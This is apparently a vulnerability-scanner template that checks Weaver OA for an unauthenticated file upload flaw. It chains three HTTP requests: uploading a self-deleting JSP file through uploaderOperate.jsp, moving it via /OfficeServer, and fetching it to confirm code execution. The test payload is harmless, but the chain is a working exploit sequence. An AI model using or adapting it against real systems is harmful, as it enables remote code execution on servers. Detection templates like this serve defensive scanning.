id: weaver-uploadoperation-fileupload

info:
  name: Weaver OA Workrelate uploaderOperate.jsp File Upload
  author: xpoc
  severity: critical
  verified: true
  tags: weaver,oa,fileupload
  created: 2023/06/22

set:
  s2: randomInt(10000000, 90000000)
  s1: randomLowercase(20)
  rboundary: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /workrelate/plan/util/uploaderOperate.jsp
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"secId\"\r\n\r\n1\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{{s1}}.jsp\"\r\n\r\n<% out.println(\"{{s2}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"plandetailid\"\r\n\r\n1\r\n------WebKitFormBoundary{{rboundary}}--"
    expression: response.status == 200 && response.body.bcontains(b"fileid")
    output:
      search: '"fileid=(?P<id1>.+?)>".bsubmatch(response.body)'
      id1: search["id1"]
      id: replaceAll(string(id1), "'", "")
  r1:
    request:
      method: POST
      path: /OfficeServer
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"aaa\"\r\n\r\n{\"OPTION\":\"INSERTIMAGE\",\"isInsertImageNew\":\"1\",\"imagefileid4pic\":\"{{id}}\"}\r\n------WebKitFormBoundary{{rboundary}}--"
    expression: response.status == 200 && response.body.bcontains(bytes(string(s2)))
  r2:
    request:
      method: GET
      path: /{{s1}}.jsp
    expression: response.status == 200 && response.body.bcontains(bytes(string(s2)))
expression: r0() && r1() && r2()
